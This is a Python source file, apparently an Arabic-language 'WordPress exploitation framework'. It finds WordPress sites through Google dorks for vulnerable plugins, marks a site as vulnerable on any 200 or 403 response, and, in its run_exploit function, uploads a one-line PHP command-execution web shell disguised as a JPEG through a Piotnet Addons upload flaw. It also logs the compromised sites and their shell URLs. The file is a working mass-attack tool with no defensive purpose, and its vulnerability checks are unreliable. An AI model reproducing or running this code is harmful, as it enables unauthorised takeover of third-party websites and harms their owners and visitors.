#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# 👑 Wi-riX WordPress Exploitation Framework v5.0 Elite 👑
# 🔥 Developer: Wi-riX | The Exploit King 🔥
# 📦 Repository: github.com/waled122/Wi-riX
# ============================================================

import os
import sys
import json
import time
import requests
from datetime import datetime
from urllib.parse import urljoin

# ======================= [ إعدادات الألوان الفخمة ] =======================
try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    # الألوان الأساسية
    R = Fore.RED
    G = Fore.GREEN
    Y = Fore.YELLOW
    B = Fore.BLUE
    C = Fore.CYAN
    M = Fore.MAGENTA
    W = Fore.WHITE
    BL = Fore.BLACK
    # ألوان الخلفية
    BG_R = Back.RED
    BG_G = Back.GREEN
    BG_Y = Back.YELLOW
    BG_B = Back.BLUE
    BG_C = Back.CYAN
    BG_M = Back.MAGENTA
    BG_W = Back.WHITE
    BG_BL = Back.BLACK
    # الأنماط
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    NORMAL = Style.NORMAL
except:
    R=G=Y=B=C=M=W=BL=BG_R=BG_G=BG_Y=BG_B=BG_C=BG_M=BG_W=BG_BL=RESET=BOLD=DIM=NORMAL=""

# ======================= [ إعدادات البرنامج ] =======================
FRAMEWORK_PATH = os.path.dirname(os.path.abspath(__file__))
DEVELOPER = "Wi-riX"
VERSION = "5.0.0 Elite"
VERSION_CODE = 500

# ======================= [ إنشاء المجلدات ] =======================
for folder in ['exploits', 'reports', 'shells', 'targets', 'logs', 'config', 'backup']:
    os.makedirs(os.path.join(FRAMEWORK_PATH, folder), exist_ok=True)

# ======================= [ قاعدة بيانات الثغرات المتكاملة ] =======================
def get_default_exploits():
    """قاعدة بيانات الثغرات مع الدركات الكاملة"""
    return {
        "1": {
            "name": "CVE-2026-4885 - Piotnet Addons RCE",
            "cve": "CVE-2026-4885",
            "risk": "🔥 CRITICAL 🔥",
            "risk_level": 10,
            "check": "/wp-content/plugins/piotnet-addons-for-elementor-pro/",
            "type": "upload_shell",
            "dork": 'inurl:"/wp-content/plugins/piotnet-addons-for-elementor-pro/"',
            "dorks": [
                'inurl:"/wp-content/plugins/piotnet-addons-for-elementor-pro/"',
                'intitle:"Piotnet Addons" inurl:wp-content',
                '"Piotnet Addons" "Elementor" vulnerability',
                'site:.com "/wp-content/plugins/piotnet-addons-for-elementor-pro/"'
            ],
            "description": "ثغرة رفع ملفات غير مقيد تؤدي إلى تنفيذ أوامر عن بعد (RCE)",
            "date_added": "2026-01-15",
            "exploit_ready": True
        },
        "2": {
            "name": "CVE-2024-6386 - WP Statistics SQLi",
            "cve": "CVE-2024-6386",
            "risk": "⚠️ HIGH ⚠️",
            "risk_level": 8,
            "check": "/wp-content/plugins/wp-statistics/",
            "type": "sqli",
            "dork": 'inurl:"/wp-content/plugins/wp-statistics/"',
            "dorks": [
                'inurl:"/wp-content/plugins/wp-statistics/"',
                'intitle:"WP Statistics" vulnerability',
                '"WP Statistics" SQL injection'
            ],
            "description": "ثغرة حقن SQL تؤدي إلى اختراق قاعدة البيانات وسحب المعلومات",
            "date_added": "2026-01-15",
            "exploit_ready": False
        },
        "3": {
            "name": "CVE-2023-5360 - Elementor Pro RCE",
            "cve": "CVE-2023-5360",
            "risk": "🔥 CRITICAL 🔥",
            "risk_level": 9,
            "check": "/wp-content/plugins/elementor-pro/",
            "type": "rce",
            "dork": 'inurl:"/wp-content/plugins/elementor-pro/"',
            "dorks": [
                'inurl:"/wp-content/plugins/elementor-pro/"',
                'intitle:"Elementor Pro" vulnerability',
                '"Elementor Pro" RCE exploit'
            ],
            "description": "ثغرة تنفيذ أوامر عن بعد في Elementor Pro",
            "date_added": "2026-01-15",
            "exploit_ready": False
        },
        "4": {
            "name": "CVE-2024-2876 - LayerSlider RFI",
            "cve": "CVE-2024-2876",
            "risk": "🟠 MEDIUM 🟠",
            "risk_level": 6,
            "check": "/wp-content/plugins/LayerSlider/",
            "type": "rfi",
            "dork": 'inurl:"/wp-content/plugins/LayerSlider/"',
            "dorks": [
                'inurl:"/wp-content/plugins/LayerSlider/"',
                'intitle:"LayerSlider" vulnerability'
            ],
            "description": "ثغرة تضمين الملفات عن بعد (RFI)",
            "date_added": "2026-01-15",
            "exploit_ready": False
        },
        "5": {
            "name": "CVE-2024-22147 - Jetpack Backup RCE",
            "cve": "CVE-2024-22147",
            "risk": "🔥 CRITICAL 🔥",
            "risk_level": 9,
            "check": "/wp-content/plugins/jetpack/",
            "type": "rce",
            "dork": 'inurl:"/wp-content/plugins/jetpack/"',
            "dorks": [
                'inurl:"/wp-content/plugins/jetpack/"',
                'intitle:"Jetpack" vulnerability backup'
            ],
            "description": "ثغرة تنفيذ أوامر عن بعد في Jetpack Backup",
            "date_added": "2026-01-15",
            "exploit_ready": False
        },
        "6": {
            "name": "CVE-2024-31200 - WooCommerce Payments RCE",
            "cve": "CVE-2024-31200",
            "risk": "🔥 CRITICAL 🔥",
            "risk_level": 10,
            "check": "/wp-content/plugins/woocommerce-payments/",
            "type": "rce",
            "dork": 'inurl:"/wp-content/plugins/woocommerce-payments/"',
            "dorks": [
                'inurl:"/wp-content/plugins/woocommerce-payments/"',
                'intitle:"WooCommerce Payments" vulnerability'
            ],
            "description": "ثغرة تنفيذ أوامر عن بعد في WooCommerce Payments",
            "date_added": "2026-01-15",
            "exploit_ready": False
        }
    }

def load_exploits():
    """تحميل قاعدة بيانات الثغرات مع معالجة الأخطاء"""
    db_path = os.path.join(FRAMEWORK_PATH, 'exploits', 'exploits_db.json')
    
    try:
        if os.path.exists(db_path):
            with open(db_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if data:
                    return data
        # إذا الملف فاضي أو مش موجود، استخدم الافتراضي
        default = get_default_exploits()
        save_exploits(default)
        return default
    except Exception as e:
        print(f"{R}[!] خطأ في تحميل الثغرات: {e}{RESET}")
        return get_default_exploits()

def save_exploits(exploits):
    """حفظ قاعدة بيانات الثغرات"""
    db_path = os.path.join(FRAMEWORK_PATH, 'exploits', 'exploits_db.json')
    try:
        with open(db_path, 'w', encoding='utf-8') as f:
            json.dump(exploits, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        print(f"{R}[!] خطأ في حفظ الثغرات: {e}{RESET}")
        return False

# ======================= [ وظائف العرض الفخمة ] =======================
def clear_screen():
    """مسح الشاشة"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header(text, char="═", width=70):
    """طباعة رأس فخم"""
    print(f"{C}{char*width}{RESET}")
    print(f"{BOLD}{W}{text.center(width)}{RESET}")
    print(f"{C}{char*width}{RESET}")

def print_success(text):
    """طباعة رسالة نجاح"""
    print(f"{G}[✓] {text}{RESET}")

def print_error(text):
    """طباعة رسالة خطأ"""
    print(f"{R}[✗] {text}{RESET}")

def print_info(text):
    """طباعة رسالة معلومات"""
    print(f"{B}[i] {text}{RESET}")

def print_warning(text):
    """طباعة رسالة تحذير"""
    print(f"{Y}[!] {text}{RESET}")

def print_banner():
    """طباعة الشعار الرئيسي"""
    clear_screen()
    print(f"{BOLD}{C}")
    print("╔" + "═"*78 + "╗")
    print("║" + " " * 78 + "║")
    print(f"║   {R}██╗    ██╗██╗██████╗ ██╗██╗  ██╗{C}    {R}███████╗██╗  ██╗██████╗ ██╗{C}         ║")
    print(f"║   {R}██║    ██║██║██╔══██╗██║╚██╗██╔╝{C}    {R}██╔════╝╚██╗██╔╝██╔══██╗██║{C}         ║")
    print(f"║   {R}██║ █╗ ██║██║██████╔╝██║ ╚███╔╝{C}     {R}█████╗   ╚███╔╝ ██████╔╝██║{C}         ║")
    print(f"║   {R}██║███╗██║██║██╔══██╗██║ ██╔██╗{C}     {R}██╔══╝   ██╔██╗ ██╔═══╝ ██║{C}         ║")
    print(f"║   {R}╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗{C}    {R}███████╗██╔╝ ██╗██║     ██║{C}         ║")
    print(f"║   {R} ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{C}    {R}╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝{C}         ║")
    print("║" + " " * 78 + "║")
    print(f"║   {BOLD}{W}🔥 Wi-riX WordPress Exploitation Framework {VERSION} 🔥{C}                ║")
    print(f"║   {BOLD}{W}👑 Developer: {DEVELOPER} | The Ultimate Hacking Tool 👑{C}                  ║")
    print(f"║   {BOLD}{W}📦 Repository: github.com/waled122/Wi-riX{C}                                   ║")
    print("║" + " " * 78 + "║")
    print("╚" + "═"*78 + "╝")
    print(f"{RESET}")

def print_main_menu():
    """طباعة القائمة الرئيسية"""
    print(f"""
{Y}╔════════════════════════════════════════════════════════════════════════════════╗
║                              {BOLD}{W}✨ القائمة الرئيسية ✨{Y}                               ║
╠════════════════════════════════════════════════════════════════════════════════╣
║                                                                                 ║
║  {BG_G}{BOLD}{BL} [1] {RESET}{BG_G}{BL}🔍 البحث عن ثغرات{RESET}{Y}                                                      ║
║      {W}└─ استعرض كل الثغرات واختر الثغرة المناسبة مع الدركات المخصصة{RESET}                          ║
║                                                                                 ║
║  {BG_C}{BOLD}{BL} [2] {RESET}{BG_C}{BL}🎯 استهداف موقع مباشر{RESET}{Y}                                                ║
║      {W}└─ أدخل رابط الموقع لاختباره مباشرة مع ثغرة محددة{RESET}                                    ║
║                                                                                 ║
║  {BG_B}{BOLD}{W} [3] {RESET}{BG_B}{W}📁 فحص ملف كامل (مجموعة أهداف){RESET}{Y}                                             ║
║      {W}└─ حمل ملف أهداف وافحصهم كلهم دفعة واحدة{RESET}                                            ║
║                                                                                 ║
║  {BG_M}{BOLD}{W} [4] {RESET}{BG_M}{W}📊 التقارير والمخترقات{RESET}{Y}                                                 ║
║      {W}└─ اعرض كل التقارير والمواقع المخترقة والشيلات المرفوعة{RESET}                               ║
║                                                                                 ║
║  {BG_R}{BOLD}{W} [5] {RESET}{BG_R}{W}🔄 تحديث الأداة{RESET}{Y}                                                      ║
║      {W}└─ تحديث إلى أحدث إصدار من GitHub{RESET}                                                  ║
║                                                                                 ║
║  {BG_Y}{BOLD}{BL} [6] {RESET}{BG_Y}{BL}❌ خروج{RESET}{Y}                                                           ║
║                                                                                 ║
╚════════════════════════════════════════════════════════════════════════════════╝
""")

def print_exploits_menu():
    """طباعة قائمة الثغرات مع الدركات"""
    exploits = load_exploits()
    
    print_header("📋 قائمة الثغرات المتاحة", "═", 80)
    
    for eid, exp in exploits.items():
        # تحديد لون الخطورة
        if "CRITICAL" in exp.get('risk', ''):
            risk_color = f"{BG_R}{BOLD}{W}"
            risk_icon = "💀"
        elif "HIGH" in exp.get('risk', ''):
            risk_color = f"{BG_R}{W}"
            risk_icon = "⚠️"
        elif "MEDIUM" in exp.get('risk', ''):
            risk_color = f"{BG_Y}{BL}"
            risk_icon = "🟠"
        else:
            risk_color = f"{BG_B}{W}"
            risk_icon = "ℹ️"
        
        print(f"""
{C}┌{'─'*76}┐{RESET}
{C}│{RESET} {BOLD}{W}[{eid}]{RESET} {C}➜{RESET} {BOLD}{exp.get('name', 'Unknown')}{RESET}
{C}│{RESET} 
{C}│{RESET}   {M}📌 CVE:{RESET} {exp.get('cve', 'N/A')}          {risk_color} {risk_icon} {exp.get('risk', 'Unknown')} {RESET}
{C}│{RESET}   {M}📝 الوصف:{RESET} {exp.get('description', 'N/A')}
{C}│{RESET}   {M}🔍 نوع الثغرة:{RESET} {exp.get('type', 'N/A')}
{C}│{RESET}   {M}📁 مسار الفحص:{RESET} {exp.get('check', 'N/A')}
{C}│{RESET}
{C}│{RESET}   {BOLD}{Y}🔎 الدروك الافتراضي:{RESET}
{C}│{RESET}      {G}{exp.get('dork', 'غير متوفر')}{RESET}
""")
        
        # عرض الدركات الإضافية
        dorks = exp.get('dorks', [])
        if dorks:
            print(f"{C}│{RESET}   {BOLD}{Y}📚 دركات إضافية:{RESET}")
            for i, d in enumerate(dorks[:3], 1):
                print(f"{C}│{RESET}      {i}. {G}{d}{RESET}")
        
        print(f"{C}└{'─'*76}┘{RESET}")
    
    print(f"\n{C}{'═'*80}{RESET}")

def print_exploit_options(exploit_id, exploit):
    """طباعة خيارات الثغرة"""
    print_header(f"🎯 ثغرة: {exploit.get('name', 'Unknown')}", "═", 80)
    
    print(f"""
  {BOLD}{C}▸ معلومات الثغرة:{RESET}
     {M}├─ CVE:{RESET} {exploit.get('cve', 'N/A')}
     {M}├─ الخطورة:{RESET} {exploit.get('risk', 'N/A')}
     {M}├─ النوع:{RESET} {exploit.get('type', 'N/A')}
     {M}└─ الوصف:{RESET} {exploit.get('description', 'N/A')}

  {BOLD}{C}▸ خيارات البحث:{RESET}
    
     {BG_G}{BOLD}{BL} [1] {RESET} 🔍 بحث تلقائي (باستخدام الدروك الافتراضي)
         {W}└─ {exploit.get('dork', 'غير متوفر')}{RESET}

     {BG_C}{BOLD}{BL} [2] {RESET} ✏️ إضافة دروك مخصص (من عندك)
         {W}└─ أدخل دروك البحث بنفسك{RESET}

     {BG_B}{BOLD}{W} [3] {RESET} 📝 إضافة رابط موقع مباشر (أو IP)
         {W}└─ أدخل الرابط يدوياً{RESET}

     {BG_Y}{BOLD}{BL} [4] {RESET} 🔙 رجوع للقائمة الرئيسية
""")

def print_scan_result(target, exploit_name, vulnerable):
    """طباعة نتيجة الفحص بشكل فخم"""
    if vulnerable:
        print(f"\n{G}┌{'─'*76}┐{RESET}")
        print(f"{G}│{RESET} {BOLD}{G}✅ الهدف ثغر!{RESET}")
        print(f"{G}│{RESET}   📌 الهدف: {target}")
        print(f"{G}│{RESET}   🔥 الثغرة: {exploit_name}")
        print(f"{G}└{'─'*76}┘{RESET}")
    else:
        print(f"\n{R}┌{'─'*76}┐{RESET}")
        print(f"{R}│{RESET} {BOLD}{R}❌ الهدف غير ثغر{RESET}")
        print(f"{R}│{RESET}   📌 الهدف: {target}")
        print(f"{R}│{RESET}   🔥 الثغرة: {exploit_name}")
        print(f"{R}└{'─'*76}┘{RESET}")

# ======================= [ وظائف البحث ] =======================
def search_google(dork, max_results=20):
    """البحث في Google عن أهداف"""
    print_info(f"جاري البحث في Google عن: {dork}")
    targets = []
    
    try:
        from googlesearch import search
        for url in search(dork, num_results=max_results):
            if url.startswith('http'):
                targets.append(url)
                print_success(f"تم العثور على: {url}")
    except ImportError:
        print_warning("مكتبة البحث غير مثبتة. جاري التثبيت...")
        os.system("pip install googlesearch-python --break-system-packages 2>/dev/null")
        print_warning("أعد تشغيل الأداة بعد التثبيت")
        return []
    except Exception as e:
        print_error(f"خطأ في البحث: {e}")
        print_warning("يمكنك استخدام الخيار 3 لإضافة روابط يدوياً")
    
    return targets

def save_targets(targets, filename_prefix="targets"):
    """حفظ الأهداف في ملف"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(FRAMEWORK_PATH, 'targets', f"{filename_prefix}_{timestamp}.txt")
    
    with open(filename, 'w', encoding='utf-8') as f:
        for target in targets:
            f.write(target + '\n')
    
    print_success(f"تم حفظ {len(targets)} هدف في: {filename}")
    return filename

# ======================= [ وظائف الفحص ] =======================
def check_vulnerability(target, exploit):
    """فحص هدف واحد لثغرة محددة"""
    check_url = urljoin(target, exploit.get('check', ''))
    try:
        r = requests.get(check_url, timeout=10, verify=False, 
                        headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code in [200, 403]:
            print_scan_result(target, exploit.get('name', 'Unknown'), True)
            return True
        else:
            print_scan_result(target, exploit.get('name', 'Unknown'), False)
            return False
    except Exception as e:
        print_error(f"خطأ في فحص {target}")
        return False

def scan_targets(targets, exploit):
    """فحص قائمة من الأهداف لثغرة محددة"""
    print_header(f"🔍 جاري فحص {len(targets)} هدف...", "═", 80)
    
    vulnerable = []
    for target in targets:
        if check_vulnerability(target, exploit):
            vulnerable.append(target)
        time.sleep(0.5)
    
    return vulnerable

def save_vulnerable(vulnerable, exploit_name):
    """حفظ الأهداف الثغرية"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(FRAMEWORK_PATH, 'targets', f"vulnerable_{timestamp}.txt")
    
    with open(filename, 'w', encoding='utf-8') as f:
        for target in vulnerable:
            f.write(f"{target} | {exploit_name}\n")
    
    # أضف للملف الرئيسي
    master_file = os.path.join(FRAMEWORK_PATH, 'targets', 'all_vulnerable.txt')
    with open(master_file, 'a', encoding='utf-8') as f:
        for target in vulnerable:
            f.write(f"{target} | {exploit_name} | {datetime.now()}\n")
    
    print_success(f"تم حفظ {len(vulnerable)} هدف ثغر في: {filename}")
    return filename

# ======================= [ وظائف الاستغلال ] =======================
def run_exploit(target, exploit):
    """تشغيل الاستغلال على هدف معين"""
    print_header(f"💣 جاري استغلال الثغرة على: {target}", "═", 80)
    
    if exploit.get('type') == 'upload_shell':
        shell_code = '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>'
        shell_name = f"wirix_{int(time.time())}.phtml"
        
        files = {'file': (shell_name, shell_code, 'image/jpeg')}
        data = {'action': 'pafe_ajax_form_builder', 'post_id': '1', 'form_id': '1'}
        
        try:
            r = requests.post(urljoin(target, "/wp-admin/admin-ajax.php"), 
                             files=files, data=data, timeout=15, verify=False)
            
            if r.status_code == 200:
                shell_url = urljoin(target, f"/wp-content/uploads/{shell_name}")
                
                print_success("تم رفع الشيل بنجاح!")
                print_header("🎯 رابط الشيل", "─", 60)
                print(f"{BOLD}{G}{shell_url}?cmd=id{RESET}")
                print_header("", "─", 60)
                
                # حفظ الشيل
                shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
                with open(shells_file, 'a', encoding='utf-8') as f:
                    f.write(f"{target} | {shell_url} | {datetime.now()}\n")
                
                return True
            else:
                print_error(f"فشل رفع الشيل (كود: {r.status_code})")
        except Exception as e:
            print_error(f"خطأ: {e}")
    
    else:
        print_warning("هذه الثغرة قيد التطوير حالياً")
    
    return False

# ======================= [ الوظائف الرئيسية ] =======================
def search_for_exploits():
    """الخيار 1: البحث عن ثغرات"""
    print_exploits_menu()
    
    exploit_id = input(f"\n{B}[?] اختر رقم الثغرة: {RESET}")
    exploits = load_exploits()
    
    if exploit_id not in exploits:
        print_error("رقم ثغرة غير صحيح!")
        input(f"{Y}[!] اضغط Enter للمتابعة...{RESET}")
        return
    
    exploit = exploits[exploit_id]
    
    while True:
        print_exploit_options(exploit_id, exploit)
        choice = input(f"{B}[?] اختر خيار (1-4): {RESET}")
        
        targets = []
        
        if choice == "1":
            # بحث تلقائي بالدروك الافتراضي
            dork = exploit.get('dork', '')
            if dork:
                targets = search_google(dork)
            else:
                print_error("لا يوجد دروك افتراضي لهذه الثغرة")
                continue
            
        elif choice == "2":
            # إضافة دروك مخصص
            custom_dork = input(f"{B}[?] أدخل الدروك المخصص: {RESET}")
            if custom_dork:
                targets = search_google(custom_dork)
            else:
                print_error("لم تدخل أي دروك")
                continue
            
        elif choice == "3":
            # إضافة رابط مباشر
            print_info("أدخل الروابط (اكتب 'done' عند الانتهاء):")
            while True:
                url = input(f"{B}رابط> {RESET}")
                if url.lower() == 'done':
                    break
                if url.startswith('http'):
                    targets.append(url)
                    print_success(f"تم إضافة: {url}")
            if not targets:
                print_warning("لم يتم إضافة أي روابط")
                continue
            
        elif choice == "4":
            return
        
        else:
            print_error("خيار غير صحيح!")
            continue
        
        if targets:
            # حفظ الأهداف
            targets_file = save_targets(targets)
            
            # فحص الأهداف
            vulnerable = scan_targets(targets, exploit)
            
            if vulnerable:
                # حفظ الأهداف الثغرية
                victims_file = save_vulnerable(vulnerable, exploit.get('name', 'Unknown'))
                
                # سؤال عن الاستغلال
                print_success(f"تم العثور على {len(vulnerable)} هدف ثغر!")
                exploit_choice = input(f"{B}[?] هل تريد استغلال أحدها؟ (y/n): {RESET}")
                
                if exploit_choice.lower() == 'y':
                    print_info("الأهداف الثغرية:")
                    for i, v in enumerate(vulnerable, 1):
                        print(f"  {C}[{i}]{RESET} {v}")
                    
                    try:
                        target_idx = int(input(f"{B}اختر رقم الهدف: {RESET}")) - 1
                        if 0 <= target_idx < len(vulnerable):
                            run_exploit(vulnerable[target_idx], exploit)
                    except:
                        pass
            else:
                print_warning("لم يتم العثور على أهداف ثغرية!")
        else:
            print_warning("لم يتم العثور على أهداف!")
        
        input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")
        break

def target_direct():
    """الخيار 2: استهداف موقع مباشر"""
    print_header("🎯 استهداف موقع مباشر", "═", 80)
    
    target = input(f"{B}[?] أدخل رابط الموقع (مثال: https://example.com): {RESET}")
    
    if not target.startswith('http'):
        target = 'https://' + target
    
    print_exploits_menu()
    exploit_id = input(f"{B}[?] اختر رقم الثغرة: {RESET}")
    exploits = load_exploits()
    
    if exploit_id in exploits:
        exploit = exploits[exploit_id]
        
        if check_vulnerability(target, exploit):
            print_success("الهدف ثغر!")
            choice = input(f"{B}[?] هل تريد استغلاله؟ (y/n): {RESET}")
            if choice.lower() == 'y':
                run_exploit(target, exploit)
        else:
            print_warning("الهدف غير ثغر لهذه الثغرة")
    else:
        print_error("رقم ثغرة غير صحيح!")
    
    input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")

def scan_file():
    """الخيار 3: فحص ملف كامل"""
    print_header("📁 فحص ملف كامل", "═", 80)
    
    targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
    files = [f for f in os.listdir(targets_dir) if f.endswith('.txt') and not f.startswith('vulnerable')]
    
    if not files:
        print_warning("لا توجد ملفات أهداف!")
        print_info("استخدم الخيار 1 أولاً للبحث عن أهداف")
        input(f"{Y}[!] اضغط Enter للمتابعة...{RESET}")
        return
    
    print_info("الملفات المتاحة:")
    for i, f in enumerate(files, 1):
        size = os.path.getsize(os.path.join(targets_dir, f))
        print(f"  {C}[{i}]{RESET} {f} ({size} بايت)")
    
    try:
        choice = int(input(f"{B}اختر ملف: {RESET}")) - 1
        if 0 <= choice < len(files):
            filepath = os.path.join(targets_dir, files[choice])
            with open(filepath, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            print_success(f"تم تحميل {len(targets)} هدف")
            
            print_exploits_menu()
            exploit_id = input(f"{B}اختر رقم الثغرة: {RESET}")
            exploits = load_exploits()
            
            if exploit_id in exploits:
                exploit = exploits[exploit_id]
                vulnerable = scan_targets(targets, exploit)
                
                if vulnerable:
                    victims_file = save_vulnerable(vulnerable, exploit.get('name', 'Unknown'))
                    print_success(f"تم العثور على {len(vulnerable)} هدف ثغر!")
                    
                    exploit_choice = input(f"{B}[?] هل تريد استغلال أحدها؟ (y/n): {RESET}")
                    if exploit_choice.lower() == 'y':
                        for i, v in enumerate(vulnerable, 1):
                            print(f"  {C}[{i}]{RESET} {v}")
                        target_idx = int(input(f"{B}اختر رقم الهدف: {RESET}")) - 1
                        if 0 <= target_idx < len(vulnerable):
                            run_exploit(vulnerable[target_idx], exploit)
            else:
                print_error("رقم ثغرة غير صحيح!")
    except:
        pass
    
    input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")

def show_reports():
    """الخيار 4: عرض التقارير والمخترقات"""
    print_header("📊 التقارير والمخترقات", "═", 80)
    
    # عرض الأهداف الثغرية
    targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
    victims_files = [f for f in os.listdir(targets_dir) if f.startswith('vulnerable_') or f == 'all_vulnerable.txt']
    
    if victims_files:
        print(f"\n{G}🎯 قائمة المواقع المخترقة:{RESET}")
        for f in victims_files:
            path = os.path.join(targets_dir, f)
            size = os.path.getsize(path)
            print(f"  {C}📄{RESET} {f} ({size} بايت)")
            
            if f == 'all_vulnerable.txt':
                with open(path, 'r', encoding='utf-8') as file:
                    lines = file.readlines()
                    if lines:
                        print(f"     {Y}آخر 5 مخترقات:{RESET}")
                        for line in lines[-5:]:
                            print(f"     {W}└─{RESET} {line.strip()}")
    
    # عرض الشيلات
    shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
    if os.path.exists(shells_file):
        print(f"\n{G}💀 الشيلات المرفوعة:{RESET}")
        with open(shells_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            for line in lines[-10:]:
                print(f"  {C}🐚{RESET} {line.strip()}")
    
    input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")

def update_framework():
    """الخيار 5: تحديث الأداة"""
    print_header("🔄 تحديث الأداة", "═", 80)
    
    print_info("جاري سحب آخر التحديثات من GitHub...")
    
    try:
        result = os.system("git pull origin main --allow-unrelated-histories")
        if result == 0:
            print_success("تم التحديث بنجاح!")
            print_warning("أعد تشغيل الأداة لتطبيق التحديثات")
        else:
            print_error("فشل التحديث! حاول يدوياً: git pull origin main")
    except Exception as e:
        print_error(f"خطأ: {e}")
    
    input(f"\n{Y}[!] اضغط Enter للمتابعة...{RESET}")

# ======================= [ التشغيل الرئيسي ] =======================
def main():
    try:
        import urllib3
        urllib3.disable_warnings()
    except:
        pass
    
    # إنشاء قاعدة البيانات الافتراضية إذا لم توجد
    db_path = os.path.join(FRAMEWORK_PATH, 'exploits', 'exploits_db.json')
    if not os.path.exists(db_path) or os.path.getsize(db_path) == 0:
        save_exploits(get_default_exploits())
    
    while True:
        try:
            print_banner()
            print_main_menu()
            choice = input(f"{BOLD}{C}{DEVELOPER}@framework> {RESET}")
            
            if choice == "1":
                search_for_exploits()
            elif choice == "2":
                target_direct()
            elif choice == "3":
                scan_file()
            elif choice == "4":
                show_reports()
            elif choice == "5":
                update_framework()
            elif choice == "6":
                print_header(f"{G}مع السلامة {DEVELOPER}! 👑", "═", 60)
                sys.exit(0)
            else:
                print_error("خيار غير صحيح!")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Y}[!] تم الإلغاء بواسطة المستخدم{RESET}")
            sys.exit(0)
        except Exception as e:
            print_error(f"خطأ غير متوقع: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main()